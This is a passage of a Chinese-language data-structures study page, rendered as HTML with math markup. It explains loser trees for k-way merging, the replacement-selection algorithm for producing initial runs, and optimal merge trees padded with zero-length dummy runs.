style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span></span></span></span> 随上增长而增长，因此内部归并时间亦随 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的增长而增长。这将抵消由于增打 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 而减少外存访问次数所得到的效益。因此，不能使用普通的内部归并排序算法。</p>
<p>为了使内部归并不受 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的增大的影响，引入了 <strong>败者树</strong>。败者树是树形选择排序的一种变体，可视为一棵完全二叉树。<code>k</code> 个叶结点分别存放 <code>k</code> 个归并段在归并过程中当前参加比较的记录，内部结点用来记忆左右子树中的 “失败者”，而让胜者往上继续进行比较，一直到根结点。若比较两个数，大的为失败者、小的为胜利者，则根结点指向的数为最小数。</p>
<p>因为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 路归并的败者树深度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_{2} k \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span></span></span></span>，因此 <code>k</code> 个记录中选择最小关键字，最多需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_{2} k \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span></span></span></span> 次比较。所以总的比较次数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi><mo stretchy="false">⌉</mo><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>r</mi><mo stretchy="false">⌉</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi><mo stretchy="false">⌉</mo><mo>=</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>r</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">S(n - 1) \lceil log_{2} k \rceil = \lceil log_{k} r \rceil (n - 1) \lceil log_{2} k \rceil = (n - 1) \lceil log_{2} r \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">⌉</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">⌉</span></span></span></span>。</p>
<p>可见，使用败者树后，内部归并的比较次数与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 无关了。因此，只要内存空间允许，增大归并路数上将有效地减少归并树的高度，从而减少 <code>I/O</code> 次数，提高外部排序的速度。</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>归并路数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 并不是越大越好。归并路数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 增大时，相应地需要增加输入缓冲区的个数。若可供使用的内存空间不变，势必要减少每个输入缓冲区的容量，使得内存、外存交换数据的次数增大。当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 值过大时，虽然归并趟数会减少，但读写外存的次数仍会增加</p>
</div>
<h4> 置换-选择排序（生成初始归并段）</h4>
<p>减少初始归并段个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 也可以减少归并趟数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>。若总的记录个数为 <code>n</code>，每个归并段的长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℓ</mi></mrow><annotation encoding="application/x-tex">\ell</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">ℓ</span></span></span></span> 则归并段的个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>=</mo><mo stretchy="false">⌈</mo><mi>n</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">r = \lceil n / \ell \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">n</span><span class="mord">/</span><span class="mord">ℓ</span><span class="mclose">⌉</span></span></span></span>。采用内部排序方法得到的各个初始归并段长度都相同（除最后一段外），它依赖于内部排序时可用内存工作区的大小。因此，必须探索新的方法，用来产生更长的初始归并段，这就是 <strong>置换-选择算法。</strong></p>
<p>设初始待排文件为 <code>FI</code>，初始归并段输出文件为 <code>FO</code>，内存工作区为 <code>WA</code>，<code>FO</code> 和 <code>WA</code> 的初始状态为空，<code>WA</code> 可容纳 <code>w</code> 个记录。置换-选择算法的步骤如下：</p>
<ol>
<li>从 <code>FI</code> 输入 <code>w</code> 个记录到工作区 <code>WA</code></li>
<li>从 <code>WA</code> 中选出其中关键字取最小值的记录，记为 <code>MINIMAX</code> 记录</li>
<li>将 <code>MINIMAX</code> 记录输出到 <code>FO</code> 中去</li>
<li>若 <code>FI</code> 不空，则从 <code>FI</code> 输入下一个记录到 <code>WA</code> 中</li>
<li>从 <code>WA</code> 中所有关键字比 <code>MINIMAX</code> 记录的关键字大的记录中选出最小关键字记录，作为新的 <code>MINIMAX</code> 记录</li>
<li>重复步骤 <code>3~5</code>，直至在 <code>WA</code> 中选不出新的 <code>MINIMAX</code> 记录为止，由此得到一个初始归并段，输出一个归并段的结束标志到 <code>FO</code> 中去</li>
<li>重复步骤 <code>2~6</code>，直至 <code>WA</code> 为空。由此得到全部初始归并段</li>
</ol>
<h4> 最佳归并树</h4>
<p>文度不件经过置换-选择排序后，得到的是长等的初始归并段。下面讨论如何组织长度不等的初始归并段的归并顺序，使得 <code>I/O</code> 次数最少。假设由置换-选择得到 <code>9</code> 个初始归并段，其长度（记录数）依次为 <code>9, 30, 12, 18, 3, 17, 2, 6, 24</code>。现做 3 路平衡归并。其归并树如下图所示。</p>
<figure><figcaption>3 路平衡归并的归并树</figcaption></figure>
<p>在上图中，各叶结点表示一个初始归并段，上面的权值表示该归并段的长度，叶结点到根的路径长度表示其参加归并的趟数，各非叶结点代表归并成的新归并段，根结点表示最终生成的归并段。树的带权路径长度 WPL 为归并过程中的总读记录数，故 <code>I/O</code> 次数 = 2 x WPL = 484。</p>
<p>显然，归并方案不同，所得归并树亦不同，树的带权路径长度（<code>I/O</code> 次数）亦不同。为了优化归并树的 WPL，可以将哈夫曼树的思想推广到 <code>m</code> 叉树的情形，在归并树中，让记录数少的初始归并段最先归并，记录数多的初始归并段最晚归并，就可以建立总的 <code>I/O</code> 次数最少的最佳归并树。上述 <code>9</code> 个初始归并段可构造成一棵如下图所示的归并树，按此树进行归并，仅需对外存进行 <code>446</code> 次读/写，这棵归并树便称为 <strong>最佳归并树。</strong></p>
<figure><figcaption>3 路平衡归并的最佳归并树</figcaption></figure>
<p>上图中的哈夫曼树是一棵严格 <code>3</code> 叉树，即树中只有度为 <code>3</code> 或 <code>0</code> 的结点。若只有 <code>8</code> 个初始归并段，如上例中少了一个长度为 <code>30</code> 的归并段。若在设计归并方案时，缺额的归并段留在最后，即除最后一次做 2 路归并外，其他各次归并仍是 3 路归并，此归并方案的外存读/写次数为 <code>386</code>。显然，这不是最佳方案。</p>
<p>正确的做法是：若初始归并段不足以构成一棵严格 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉树时，需添加长度为 <code>0</code> 的 “虚段”，按照哈夫曼树的原则，权为 <code>0</code> 的叶子应离树根最远。因此，最佳归并树应如下图所示。</p>
<figure><figcaption>8 个归并段的最佳归并树</figcaption></figure>
<p>如何判定添加虚段的数目。设度为 <code>0</code> 的结点有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">n_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>（= n）个，度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的结点有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个，则对严格 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉树有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msub><mi>n</mi><mi>k</mi></msub><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n_{0} = (k - 1)n_{k} + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，由此可得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>n</mi><mn>0</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_{k} = (n_{0} - 1) / (k - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p>
<ul>
<li>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>n</mi><mn>0</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(n_{0} - 1) \% (k - 1) = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">%</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>（% 为取余运算），则说明这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">n_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个叶结点（初始归并段）正好可以构造 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉归并树。此时，内结点有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个</li>
